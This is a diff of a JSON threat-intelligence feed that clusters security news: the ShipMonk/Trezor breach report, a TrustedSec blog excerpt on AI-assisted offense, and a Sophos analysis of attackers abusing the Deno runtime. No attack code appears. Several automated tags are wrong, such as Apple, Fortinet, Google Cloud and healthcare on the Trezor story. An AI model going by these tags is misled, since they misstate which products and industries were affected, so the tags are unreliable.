+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "phishing_social_eng",
+          "ransomware_extortion",
+          "supply_chain",
+          "zero_day"
+        ],
+        "actor_attribution": [
+          "ShinyHunters"
+        ],
+        "affected_industries": [
+          "financial_services",
+          "healthcare"
+        ],
+        "affected_products": [
+          "Apple iOS/macOS",
+          "Fortinet",
+          "Google Cloud"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "no_patch_yet",
+          "zero_day"
+        ],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "SecurityWeek",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "14,000 Trezor Customers Impacted by Data Breach at ShipMonk",
+        "link": "https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/",
+        "published": "2026-08-14T08:16:00+00:00",
+        "summary": "Hackers stole the customers’ shipping information, including names, addresses, email addresses, and phone numbers. The post 14,000 Trezor Customers Impacted by Data Breach at ShipMonk appeared first on SecurityWeek .",
+        "full_body": "Hardware crypto wallet provider Trezor says the personal information of nearly 14,000 people was compromised in a data breach. The incident, it says, did not involve Trezor’s systems but rather its third-party shipping provider, ShipMonk. Trezor was notified of the attack on August 10. Customers in the US, the UK, Sweden, Colombia, Brazil, Italy, and Portugal who placed orders between May 10 and August 8 were affected. “We’re extremely sorry to inform our community that customer personal information, including full names, phone numbers, email addresses, and shipping addresses, has been accessed by an unauthorized actor during this breach,” Trezor says in a notice . Hackers stole the names, addresses, email addresses, and phone numbers of 11,742 customers, as well as the names, cities, and email addresses of 1,947 customers. Trezor shared the information with ShipMonk for order delivery purposes. “The breach is limited due to Trezor’s strict 90-day data storage policy (we were also able to negotiate the same terms with fulfillment partners, who follow the same policy),” the company says, but notes that for the 1,947 customers with partial exposure, older orders might have been accessed as well. Advertisement. Scroll to continue reading. “To be clear, our systems were not compromised, and your Trezor device is secure, but the affected customers might be targeted by more sophisticated phishing attempts,” the company says. Trezor notified all impacted customers via email and advised them to be wary of suspicious communication that requests personal information or prompts for immediate action. The company says it is in direct contact with ShipMonk to establish an exact timeline of events and determine the full scope of the data breach. ShipMonk reportedly notified customers that hackers accessed customer data by exploiting a vulnerability in Metabase. The targeted bug is likely the SQL injection zero-day that Metabase patched last week. The notorious extortion group ShinyHunters claimed responsibility for an attack on Metabase. On Wednesday, the group leaked data allegedly stolen from the data analytics solutions provider. ShipMonk has yet to acknowledge the incident publicly. It is unclear how many companies might have been affected, whether other individuals’ personal information was stolen, and who was behind the attack. SecurityWeek has emailed ShipMonk for a statement on the data breach and will update this article if the company responds. Related: Ceva Logistics Operations Disrupted by Cyberattack Related: Corporate Data Stolen in Levi Strauss Cyberattack Related: 3.8 Million Impacted by Unlimited Technology Systems Data Breach Related: 311,000 Impacted by Brown Health Medical Group-MA Data Breach Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Adobe Commerce Bug Targeted Immediately After Disclosure WordPress 7.0.4 Patches Remote Code Execution Vulnerability Fortinet Patches Authentication Flaws in FortiWeb and FortiManager Critical VMware vCenter Vulnerability in Attackers’ Crosshairs Nightmare Eclipse Drops Windows Zero-Day Exploit ‘ShieldBreak’ Mindgard Raises $30 Million to Protect AI Systems Ceva Logistics Operations Disrupted by Cyberattack Over 2,500 Organizations Impacted by LiteLLM Supply Chain Attack Latest News In Other News: Rapid7 Layoffs, Hacking a Boeing 737, Refrigeration System Vulnerabilities Trivy, Not LiteLLM Behind the 2,500 Org Compromise Google Cloud Sets Out Post-Quantum Roadmap With 2029 Readiness Goal 1.6 Million Likely Impacted by RingCentral Data Breach Over 1,000 Charities Hit by Beacon CRM Data Breach Hackers Exploiting Unpatched GeoServer Zero-Day AmnesiaStealer macOS Malware Steals Data, Controls Browser Sessions Cybersecurity M&A Roundup: 21 Deals Announced in July 2026 Trending Daily Briefi",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "supply_chain",
+            "phishing_social_eng",
+            "zero_day",
+            "data_breach"
+          ],
+          "actor_attribution": [
+            "ShinyHunters"
+          ],
+          "affected_industries": [
+            "healthcare",
+            "financial_services"
+          ],
+          "affected_products": [
+            "Google Cloud",
+            "Fortinet",
+            "Apple iOS/macOS"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day",
+            "no_patch_yet"
+          ],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Google Cloud": "target",
+            "Fortinet": "target",
+            "Apple iOS/macOS": "target",
+            "VMware": "target",
+            "WordPress": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "SecurityWeek",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "14,000 Trezor Customers Impacted by Data Breach at ShipMonk",
+          "link": "https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/",
+          "published": "2026-08-14T08:16:00+00:00",
+          "summary": "Hackers stole the customers’ shipping information, including names, addresses, email addresses, and phone numbers. The post 14,000 Trezor Customers Impacted by Data Breach at ShipMonk appeared first on SecurityWeek .",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "supply_chain",
+              "phishing_social_eng",
+              "zero_day",
+              "data_breach"
+            ],
+            "actor_attribution": [
+              "ShinyHunters"
+            ],
+            "affected_industries": [
+              "healthcare",
+              "financial_services"
+            ],
+            "affected_products": [
+              "Google Cloud",
+              "Fortinet",
+              "Apple iOS/macOS"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day",
+              "no_patch_yet"
+            ],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Google Cloud": "target",
+              "Fortinet": "target",
+              "Apple iOS/macOS": "target",
+              "VMware": "target",
+              "WordPress": "target"
             },
             "weak_tags": {
               "products": []
@@ -7665,18 +7864,14 @@
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [
-          "phishing_social_eng"
-        ],
+        "threat_categories": [],
         "actor_attribution": [],
         "affected_industries": [],
         "affected_products": [],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
-        "urgency_signals": [
-          "preauth_unauth"
-        ],
+        "urgency_signals": [],
         "content_type": [
           "news_report"
         ],
@@ -7691,21 +7886,17 @@
         "link": "https://trustedsec.com/blog/ai-offense-is-not-noclip-mode",
         "published": "2026-08-13T04:00:00+00:00",
         "summary": "<p>AI doesn't let attackers walk through walls, but it makes finding the cracks more efficient. In this blog, we cut through the hype and explain what AI-driven offense really looks like and why hard controls still work.</p>",
-        "full_body": "Blog AI Offense is Not Noclip Mode August 13, 2026 AI Offense is Not Noclip Mode Written by Justin Elze Artificial Intelligence (AI) Table of contents The Walls Are Real Reachability is the Variable Nobody Prices Why wp2shell Matters Ten Thousand Eyes Humans Are an Attack Surface Too AI Changes the Economics, Not the Requirements What Defenders Should Actually Do Persistence is Not a Skeleton Key References Everyone wants the cinematic version of offensive AI. The model finds a path nobody knew existed, ignores the controls, and lands on the objective using an attack class that did not previously exist. Noclip mode. Walk through the wall, skip the level. That framing is fun. It is also mostly wrong about the near-term risk. The practical advantage is more boring and more dangerous. AI makes it cheap to keep trying against attack paths we already understand. It can test more variations, explain why something failed, change approaches, connect findings across a codebase nobody has time to read end to end, and continue long after a human operator would have burned the engagement budget and moved on. That matters. It is also not magic, and the difference between those two statements is where most of the current commentary falls apart. The Walls Are Real Known attack paths generally have controls built around them. Conditional Access with device compliance and phishing-resistant authentication breaks a lot of credential abuse. WDAC or AppLocker in enforcement mode breaks a lot of execution. ASLR, DEP, CFG, CET, and the rest of the memory protection stack made entire exploit classes harder, less reliable, and more expensive. Segmentation limits movement. Tiered administration and LAPS limit what a foothold is worth. Rate limits, lockouts, logging, and behavioral detection still work at machine speed. A model does not reason its way past those controls because it tried hard enough. A blocked process is still blocked. A token that does not satisfy Conditional Access is still rejected. A memory corruption bug still has to survive whatever mitigations are compiled into the target. A host that cannot route to another segment does not acquire a route because someone wrote a better prompt. The problem is that almost nobody has one clean wall—a single, consistently enforced defensive boundary where the same controls apply everywhere. Instead, they have fifteen years of overlapping products, exceptions, legacy workflows, trusted paths, exclusions, stale systems, half-finished deployments, and controls enforced in one OU and left in audit mode in another. The result not exactly a wall, but a patchwork of defenses with gaps, seams, and inconsistent enforcement that attackers can work around. As I wrote in The Defensive Stack Is Exposed , the decision logic inside defensive products is increasingly part of the attack surface. Rules, thresholds, exclusions, trusted paths, and management states can now be studied together instead of one at a time. AI makes finding those seams cheaper. It can test every door, window, vent, service entrance, and badly patched section of drywall, compare versions, watch how the defensive product behaves, recover from dead ends, and keep refining until it finds the place where two controls do not quite overlap. Reachability is the Variable Nobody Prices There is another part of this conversation that keeps getting skipped: The attacker has to be able to reach the vulnerable surface. This is straightforward when the target is an unauthenticated Internet-facing application. Scan for it, send requests, and iterate without compromising anything first. Once the vulnerable component sits behind authentication, on an internal VLAN, inside a specific workflow, or behind a configuration almost nobody runs, the economics change. Now the attacker needs credentials, a foothold, routing, a particular role, a specific dependency version, or an earlier bug just to get within arm’s reach of the interesting code. That does not make t",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "not_attempted",
         "taxonomy": {
-          "threat_categories": [
-            "phishing_social_eng"
-          ],
+          "threat_categories": [],
           "actor_attribution": [],
           "affected_industries": [],
           "affected_products": [],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
-          "urgency_signals": [
-            "preauth_unauth"
-          ],
+          "urgency_signals": [],
           "content_type": "news_report",
           "confidence_tier": "tier_2_operator",
           "role_map": {},
@@ -7723,18 +7914,14 @@
           "published": "2026-08-13T04:00:00+00:00",
           "summary": "<p>AI doesn't let attackers walk through walls, but it makes finding the cracks more efficient. In this blog, we cut through the hype and explain what AI-driven offense really looks like and why hard controls still work.</p>",
           "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng"
-            ],
+            "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
-            "urgency_signals": [
-              "preauth_unauth"
-            ],
+            "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_2_operator",
             "role_map": {},
@@ -7752,9 +7939,7 @@
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [
-          "phishing_social_eng"
-        ],
+        "threat_categories": [],
         "actor_attribution": [],
         "affected_industries": [],
         "affected_products": [],
@@ -7776,12 +7961,10 @@
         "link": "https://www.sophos.com/en-us/blog/deno-case-studies",
         "published": "2026-08-11T00:00:00+00:00",
         "summary": "Attack TTPs combine fileless execution, wide LOLBin use Categories: Threat Research",
-        "full_body": "Abuse of alternative runtime environments Deno-tes defender headaches Attack TTPs combine fileless execution, wide LOLBin use Written by Wong Jun Qi , Krishna Priya Vijayakumar Threat Research Share This Link Copied In early 2026, Sophos MDR investigated multiple intrusion cases involving a threat activity cluster that consistently abused Deno, a legitimate JavaScript and TypeScript runtime environment, to execute malicious JavaScript payloads directly in memory. Although the initial access vectors varied among victims, analysis of the observed malware, infrastructure, and execution chains revealed a shared set of post-compromise behaviors and tooling. This post examines the tactics, techniques and procedures (TTPs) utilized by the threat actors and observed by Sophos MDR incident responders during the first part of the year. By analyzing commonalities across a selection of cases, MDR identified a repeatable attack framework, which it continues to track. Our threat-hunting colleagues in Sophos’ Counter Threat Unit have likewise been watching the evolution of ClickFix-involved Deno abuse; a description of what they see from their perspective (and in a later evaluation window) is posted here . Overview The growing adoption of alternative runtime environments presents a challenge for defenders. Security tooling and behavioral detections are often optimized around established attack pathways and commonly abused scripting engines. While Deno is a legitimate development tool, its adoption by the threat actor reflects a shift towards leveraging less commonly monitored runtime environments to facilitate reliable payload execution through potentially unmonitored pathways. In the cases we analyze in this report, the attackers used a Bring Your Own Runtime (BYOR) approach to guarantee consistent execution across victim environments, independent of whatever runtimes were already present on the host. In all these cases, the threat actor downloaded and installed the Deno runtime before executing obfuscated JavaScript payloads, mainly C2 (command-and-control) payloads. Across multiple observed cases, the threat actors combined social engineering, web-based delivery mechanisms, and malware masquerading as legitimate software to gain initial access. Once a foothold was established, malicious MSI packages were used to deploy VBS and PowerShell loaders that subsequently retrieved, installed, and executed the Deno runtime. Throughout both the initial access stage and post-compromise activity, the threat actors heavily leveraged living-off-the-land binaries (LOLBins), including msiexec, wscript, PowerShell, curl, and tar. Extensive use of VBS, PowerShell, and other native binaries enabled the threat actors to establish persistence, perform host fingerprinting, retrieve additional payloads, deploy the Deno runtime, and maintain command-and-control communications while blending malicious activity with legitimate system operations. Various JavaScript payloads executed via Deno performed host fingerprinting, execution control checks, persistent C2 communications, and in some instances facilitated the retrieval and execution of additional payloads. Despite variations in victim targeting and secondary payload deployment, the underlying staging mechanisms, runtime deployment techniques, and C2 design remained highly consistent. These observations are consistent with publicly reported activity involving Deno abuse. ThreatDown documented a similar intrusion chain involving Deno-based JavaScript execution and the delivery of Castle RAT, highlighting the growing interest among threat actors in leveraging alternative runtime environments for stealthier post-compromise operations. This report further examines the campaign's mechanisms, including variations in secondary payload deployment across affected victims. In addition, this report presents detailed analysis of a recovered malicious MSI file, providing insights into the threat actor's staging mechanisms, ",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "not_attempted",
         "taxonomy": {
-          "threat_categories": [
-            "phishing_social_eng"
-          ],
+          "threat_categories": [],
           "actor_attribution": [],
           "affected_industries": [],
           "affected_products": [],
@@ -7806,9 +7989,7 @@
           "published": "2026-08-11T00:00:00+00:00",
           "summary": "Attack TTPs combine fileless execution, wide LOLBin use Categories: Threat Research",
           "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng"
-            ],
+            "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [],
@@ -8784,6 +8965,56 @@
       ]
     },
     {
+      "label": "data breach targeting Apple iOS/macOS",
+      "anchor_signal": "Apple iOS/macOS",
+      "theme_key": "apple-ios-macos",
+      "dominant_features": {
+        "threat_categories": [
+          "data_breach",
+          "zero_day",
+          "supply_chain",
+          "ransomware_extortion"
+        ],
+        "affected_products": [
+          "Apple iOS/macOS",
+          "Fortinet",
+          "Google Cloud"
+        ],
+        "urgency_signals": [
+          "zero_day",
+          "no_patch_yet"
+        ]
+      },
+      "cluster_count": 6,
+      "article_count": 11,
+      "cohesion": 0.256,
+      "shared_strong_signals": [
+        "Apple iOS/macOS"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "d32aa43a64",
+        "cb8fdf38e7",
+        "e3235a03c3",
+        "c97f90a69b",
+        "b3aa07bd4c",
+        "a06704d870"
+      ],
+      "links": [
+        "https://www.securityweek.com/hackers-exploiting-unpatched-geoserver-zero-day/",
+        "https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/",
+        "https://securelist.com/malware-report-q2-2026-pc-iot-statistics/120960/",
+        "https://www.bleepingcomputer.com/news/security/hackers-exploit-macos-screen-sharing-flaw-to-deploy-monero-miner/",
+        "https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/",
+        "https://risky.biz/RBNEWS600/",
+        "https://www.securityweek.com/amnesiastealer-macos-malware-steals-data-controls-browser-sessions/",
+        "https://thehackernews.com/2026/08/progress-kemp-loadmaster-flaw-hits-cisa.html",
+        "https://www.securityweek.com/1-6-million-likely-impacted-by-ringcentral-data-breach/",
+        "https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/"
+      ]
+    },
+    {
       "label": "CVE-2026-62832 exploitation (Microsoft SharePoint)",
       "anchor_signal": "CVE-2026-62832",
       "theme_key": "cve-2026-62832",
@@ -8824,63 +9055,6 @@
         "https://krebsonsecurity.com/2026/08/microsoft-plugs-nearly-400-security-holes/",
         "https://www.darkreading.com/application-security/microsofts-patch-tuesday-deluge-continues",
         "https://www.bleepingcomputer.com/news/microsoft/microsoft-patches-legacyhive-windows-zero-day-vulnerability/"
-      ]
-    },
-    {
-      "label": "zero day targeting Apple iOS/macOS",
-      "anchor_signal": "Apple iOS/macOS",
-      "theme_key": "apple-ios-macos",
-      "dominant_features": {
-        "threat_categories": [
-          "zero_day",
-          "data_breach",
-          "supply_chain",
-          "ransomware_extortion",
-          "phishing_social_eng"
-        ],
-        "actor_attribution": [
-          "ShinyHunters"
-        ],
-        "affected_industries": [
-          "government",
-          "telecommunications",
-          "financial_services"
-        ],
-        "affected_products": [
-          "Apple iOS/macOS",
-          "Fortinet",
-          "Google Cloud"
-        ],
-        "urgency_signals": [
-          "zero_day",
-          "no_patch_yet"
-        ]
-      },
-      "cluster_count": 5,
-      "article_count": 10,
-      "cohesion": 0.29,
-      "shared_strong_signals": [
-        "Apple iOS/macOS"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "d32aa43a64",
-        "e3235a03c3",
-        "c97f90a69b",
-        "b3aa07bd4c",
-        "a06704d870"
-      ],
-      "links": [
-        "https://www.securityweek.com/hackers-exploiting-unpatched-geoserver-zero-day/",
-        "https://securelist.com/malware-report-q2-2026-pc-iot-statistics/120960/",
-        "https://www.bleepingcomputer.com/news/security/hackers-exploit-macos-screen-sharing-flaw-to-deploy-monero-miner/",
-        "https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/",
-        "https://risky.biz/RBNEWS600/",
-        "https://www.securityweek.com/amnesiastealer-macos-malware-steals-data-controls-browser-sessions/",
-        "https://thehackernews.com/2026/08/progress-kemp-loadmaster-flaw-hits-cisa.html",
-        "https://www.securityweek.com/1-6-million-likely-impacted-by-ringcentral-data-breach/",
-        "https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/"
       ]
     },
     {
@@ -9013,14 +9187,14 @@
       "cluster_ids": [
         "d32aa43a64",
         "b3aa07bd4c",
-        "a06704d870",
-        "ab440398cd"
+        "ab440398cd",
+        "a06704d870"
       ],
       "links": [
         "https://www.securityweek.com/hackers-exploiting-unpatched-geoserver-zero-day/",
         "https://www.securityweek.com/1-6-million-likely-impacted-by-ringcentral-data-breach/",
-        "https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/",
-        "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/"
+        "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
+        "https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/"
       ]
     },
     {
